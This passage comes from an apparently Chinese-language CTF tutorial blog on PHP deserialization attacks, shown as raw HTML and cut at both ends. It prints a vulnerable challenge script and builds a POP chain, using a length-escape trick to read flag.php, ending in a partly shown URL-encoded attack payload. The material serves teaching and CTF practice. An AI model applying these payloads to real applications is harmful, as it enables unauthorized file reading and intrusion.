variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/04/28/best-phpserialize/10.png" alt="image-20200429233400791"></p><p>得到的字符串base64解密即可得flag。</p><h3 id="1-2-6-反序列化长度逃逸"><a href="#1-2-6-反序列化长度逃逸" class="headerlink" title="1.2.6  反序列化长度逃逸"></a>1.2.6  反序列化长度逃逸</h3><h4 id="长度减小逃逸"><a href="#长度减小逃逸" class="headerlink" title="长度减小逃逸"></a>长度减小逃逸</h4><p>以2020年4月安恒杯的一道真题为例，writeup：<a href="https://blog.csdn.net/SopRomeo/article/details/105849403" target="_blank" rel="noopener">https://blog.csdn.net/SopRomeo/article/details/105849403</a></p><p><a href="https://www.bilibili.com/video/BV1tV411d78y?from=search&amp;seid=17242247069452100053" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1tV411d78y?from=search&amp;seid=17242247069452100053</a></p><p>题目源码如下：</p><pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'*'</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'*'</span> <span class="token punctuation">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'gqy'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//flag.php</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">'nice'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路：</p><p><strong>1、</strong>很明显的pop链</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">c</span> <span class="token operator">=</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2、</strong>只要让A类的一个属性为我们构造的pop链即可。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">'1'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'1'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//O:1:"A":2:{s:8:"username";s:1:"1";s:8:"password";s:1:"1";}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3、</strong>构造过程：</p><p><img src="/2020/04/28/best-phpserialize/11.png" alt="image-20200503095637046"></p><p>可以看到题目定义的read函数是一个由6字节变为3字节，长度减小的过程，此处即是利用点。</p><pre class="line-numbers language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>从"拆为两块O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span>"<span class="token number">1</span><span class="token string">";s:8:"</span>password<span class="token string">";s:1:"</span><span class="token number">1</span>"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>第二块复制到password属性值的地方O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>因为上一步是放在<span class="token string">""</span>这里的，随意修改为我们想要的内容：O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"password"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span>"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>这时password属性值的地方都是我们构造的，其长度显然是个两位数，假设是<span class="token number">44</span>这时username属性值的地方我开始的时候填了个<span class="token number">1</span>方便构造，也可以删掉了。O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">44</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"password"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span>"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>确定逃逸字符：<span class="token number">23</span>位<span class="token string">";s:8:"</span>password<span class="token string">";s:44:"</span>因为每次长度减<span class="token number">3</span>，这里需要是<span class="token number">3</span>的倍数，在加一位数吧，凑个<span class="token number">24</span>位，也就是说减<span class="token number">8</span>次<span class="token string">";s:8:"</span>password<span class="token string">";s:44:"</span><span class="token number">1</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">44</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"password"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span>"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>至此username：\<span class="token package"><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0<span class="token punctuation">\</span><span class="token punctuation">\</span>0</span>password<span class="token punctuation">:</span><span class="token number">1</span><span class="token string">";s:8:"</span>password<span class="token string">";O:1:"</span>B<span class="token string">":1:{s:1:"</span>b<span class="token string">";O:1:"</span>C<span class="token string">":1:{s:1:"</span>c<span class="token string">";s:8:"</span>flag<span class="token punctuation">.</span>php"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span>再进行一次urlencode，就可以用了<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>上一步username处不要用工具去编码，用urlencode<span class="token operator">?</span>a<span class="token operator">=</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">%</span><span class="token constant">5C0</span><span class="token operator">&amp;</span>b<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BO</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token constant">22B</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token 